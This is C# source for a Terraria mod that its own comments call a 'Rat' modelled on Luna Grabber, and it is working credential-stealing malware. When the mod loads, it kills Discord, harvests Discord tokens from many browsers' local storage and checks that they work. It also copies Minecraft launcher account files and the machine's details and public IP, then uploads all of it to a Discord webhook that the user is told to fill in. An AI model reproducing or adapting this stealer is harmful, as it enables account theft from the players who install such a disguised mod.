using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Terraria.ModLoader;
using Newtonsoft.Json;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Data.Sql;
using System.IO.Compression;

// Rat Made by Sal (salomao31_termedv3)
// Inspired on Luna Grabber 

namespace Test
{
    public class Test : Mod
    {
        private static readonly HttpClient client = new HttpClient();
        // Replace with your discord webhook
        private static readonly string webhookUrl = "";
        
        // Initialize the mod
        public override void Load()
        {
            Task.Run(async () => await SendWebhookMessageAsync()).GetAwaiter().GetResult();
        }
        
        // Get all minecraft sessions from every directory

        public void terminateDiscord()
        {
            Process[] discordProcesses = Process.GetProcessesByName("discord");
            foreach (Process process in discordProcesses)
            {
                if (!process.HasExited)
                {
                    process.Kill();
                    process.WaitForExit();
                    Logger.Info($"Terminated discord.exe with PID: {process.Id}");
                }
            }
        }
        
        public List<string> GetDiscord()
        {
            // Close Discord
            Console.WriteLine("Closing Discord...");
            terminateDiscord();
            
            List<string> tokens = new List<string>();
        
            string tokenPattern = @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}";
            Regex tokenRegex = new Regex(tokenPattern);
        
            Dictionary<string, string> paths = new Dictionary<string, string>
            {
                { "Discord",                 Environment.ExpandEnvironmentVariables("%AppData%\\discord\\Local Storage\\leveldb\\") },
                { "Discord Canary",          Environment.ExpandEnvironmentVariables("%AppData%\\discordcanary\\Local Storage\\leveldb\\") },
                { "Lightcord",               Environment.ExpandEnvironmentVariables("%AppData%\\Lightcord\\Local Storage\\leveldb\\") },
                { "Discord PTB",             Environment.ExpandEnvironmentVariables("%AppData%\\discordptb\\Local Storage\\leveldb\\") },
                { "Opera",                   Environment.ExpandEnvironmentVariables("%AppData%\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\") },
                { "Opera GX",                Environment.ExpandEnvironmentVariables("%AppData%\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\") },
                { "Amigo",                   Environment.ExpandEnvironmentVariables("%LocalAppData%\\Amigo\\User Data\\Local Storage\\leveldb\\") },
                { "Torch",                   Environment.ExpandEnvironmentVariables("%LocalAppData%\\Torch\\User Data\\Local Storage\\leveldb\\") },
                { "Kometa",                  Environment.ExpandEnvironmentVariables("%LocalAppData%\\Kometa\\User Data\\Local Storage\\leveldb\\") },
                { "Orbitum",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Orbitum\\User Data\\Local Storage\\leveldb\\") },
                { "CentBrowser",             Environment.ExpandEnvironmentVariables("%LocalAppData%\\CentBrowser\\User Data\\Local Storage\\leveldb\\") },
                { "7Star",                   Environment.ExpandEnvironmentVariables("%LocalAppData%\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\") },
                { "Sputnik",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\") },
                { "Vivaldi",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\") },
                { "Chrome SxS",              Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome SxS\\User Data\\Default\\Local Storage\\leveldb\\") },
                { "Chrome",                  Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\") },
                { "Chrome1",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\") },
                { "Chrome2",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\") },
                { "Chrome3",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\") },
                { "Chrome4",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\") },
                { "Chrome5",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\") },
                { "Epic Privacy Browser",    Environment.ExpandEnvironmentVariables("%LocalAppData%\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\") },
                { "Microsoft Edge",          Environment.ExpandEnvironmentVariables("%LocalAppData%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\") },
                { "Uran",                    Environment.ExpandEnvironmentVariables("%LocalAppData%\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\") },
                { "Yandex",                  Environment.ExpandEnvironmentVariables("%LocalAppData%\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\") },
                { "Brave",                   Environment.ExpandEnvironmentVariables("%LocalAppData%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\") },
                { "Iridium",                 Environment.ExpandEnvironmentVariables("%LocalAppData%\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\") }
            };
        
            foreach (var kvp in paths)
            {
                string path = kvp.Value;
                
                if (!Directory.Exists(path))
                    continue;
        
                foreach (string file in Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext != ".log" && ext != ".ldb")
                        continue;
        
                    try
                    {
                        foreach (string line in File.ReadLines(file))
                        {
                            if (string.IsNullOrWhiteSpace(line))
                                continue;
        
                            MatchCollection matches = tokenRegex.Matches(line);
                            foreach (Match match in matches)
                            {
                                string token = match.Value;
                                if (!string.IsNullOrWhiteSpace(token) && !tokens.Contains(token))
                                {
                                    tokens.Add(token);
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[WARN] Failed to read file {file}: {ex.Message}");
                    }
                }
            }
        
            return tokens;
        }


        
        public byte[][] GetMinecraft()
        {
            byte[][] files = new byte[6][];
            
            // All Minecraft access token dirs ( Mondriths app.db can take up to 30mb+)
            string[] Paths = new[]
            {
                Environment.ExpandEnvironmentVariables(@"%AppData%\PrismLauncher\accounts.json"),
                Environment.ExpandEnvironmentVariables(@"%AppData%\.minecraft\launcher_accounts.json"),
                Environment.ExpandEnvironmentVariables(@"%AppData%\.minecraft\launcher_accounts_microsoft_store.json"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    @".lunarclient\settings\game\accounts.json"),
                Environment.ExpandEnvironmentVariables(@"%AppData%\ModrinthApp\app.db"),
                Environment.ExpandEnvironmentVariables(@"%AppData%\.feather\account.txt")
            };

            for (int i = 0; i < Paths.Length; i++)
            {
                byte[] fileBytes = File.Exists(Paths[i]) ? File.ReadAllBytes(Paths[i]) : null;
                files[i] = fileBytes;
            }
            
            return files;
        }
        
        private async Task SendWebhookMessageAsync()
        {
            try
            {
                string message = "**Information Gathered**:\n";
                message += $"\n``PC Username``: **{Environment.SpecialFolder.UserProfile}**";
                message += $"\n``PC Name``: **{System.Environment.MachineName}**";
                message += $"\n``OS``: **{System.Runtime.InteropServices.RuntimeInformation.OSDescription}**";

                // 1. Add IP to the embed
                string IpResponse = await GetNetworkInfo();
                message += $"\n``Public IP``: ||{IpResponse}||\n";
                
                // 2. Add minecraft session files and info to the embed
                using (var form = new MultipartFormDataContent())
                {
                    message += "\n**Minecraft Launchers Grabbed**:\n";
                    byte[][] minecraftSessions = GetMinecraft();
                    string[] launchers = new[]
                    {
                        "Prism Launcher",
                        "Minecraft Official Old",
                        "Minecraft Official New",
                        "Lunar Client",
                        "Modrinth Launcher",
                        "Feather Client"
                    };

                    for (int i = 0; i < minecraftSessions.Length; i++)
                    {
                        if (minecraftSessions[i] != null)
                        {
                            byte[] fileToSend = minecraftSessions[i];
                            string fileName = $"{launchers[i]}.json";

                            if (i == 4) 
                            {
                                using (var output = new MemoryStream())
                                {
                                    using (var gzip = new GZipStream(output, CompressionMode.Compress))
                                    {
                                        gzip.Write(minecraftSessions[i], 0, minecraftSessions[i].Length);
                                    }
                                    fileToSend = output.ToArray();
                                    fileName = "Modrinth.json.gz"; 
                                }
                            }

                            form.Add(new ByteArrayContent(fileToSend), $"file{i}", fileName);
                            Logger.Info($"Added {launchers[i]}");
                            message += $"\n``{launchers[i]}``: :white_check_mark:";
                        }
                        else
                        {
                            message += $"\n``{launchers[i]}``: :x:";
                        }
                    }
                
                    
                    // 3. Add Discord Info
                    message += "\n";
                    message += "\n**Discord Info Grabbed**:\n";
                    List<string> tokens = GetDiscord();
                    List<string> workingTokens = new List<string>();
                    
                    // Check if discord tokens are valid
                    foreach (string token in tokens)
                    {
                        HttpClient client2 = new HttpClient();
                        client2.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("authorization", token);
                        HttpResponseMessage response = await client2.GetAsync("https://discord.com/api/v9/users/@me/library");

                        if (response.StatusCode.Equals(200))
                        {
                            workingTokens.Add(token);
                            Logger.Info("Added Token");
                        }
                        else
                        {
                            Logger.Info("Invalid Token");
                        }
                    }
                    
                    
                    if (workingTokens.Count > 0)
                    {
                        message += "\nDiscord Tokens:\n";
                        foreach (string token in workingTokens) 
                        {
                            message += $"||```{token}```||";
                        }
                    }
                    else
                    {
                        message += "``No Valid Tokens Found``";
                    }
                    
                    // Discord embed 
                    var payload = new
                    {
                        embeds = new[]
                        {
                            new
                            {
                                title = "A User has installed the mod!",
                                description = message.Replace("\"", "\\\"")
                            }
                        }
                    };
                    string payloadJson = JsonConvert.SerializeObject(payload);
                    form.Add(new StringContent(payloadJson, Encoding.UTF8, "application/json"), "payload_json");
                    
                    // Send Embed
                    HttpResponseMessage response2 = await client.PostAsync(webhookUrl, form);
                    
                    if (response2.IsSuccessStatusCode)
                    {
                        Logger.Info("Successfully sent message to Discord webhook!");
                    }
                    else
                    {
                        Logger.Error($"Failed to send message to Discord webhook. Status: {response2.StatusCode}");
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Error sending Discord webhook: {ex.Message}");
            }
        }

        public async Task<List<string>> GetNetworkInfo()
        {
            List<string> NwInfo = new List<string>();
            
            // Get IP
            HttpResponseMessage response = await client.GetAsync("https://api.ipify.org/?format=json");
            if (response.IsSuccessStatusCode)
            {
                string ipJson = await response.Content.ReadAsStringAsync();
                var jsonObject = JsonConvert.DeserializeObject<dynamic>(ipJson);
                string ip = jsonObject.ip;
                NwInfo.Append(ip);
            }

            
            return NwInfo;
        }
    }

}
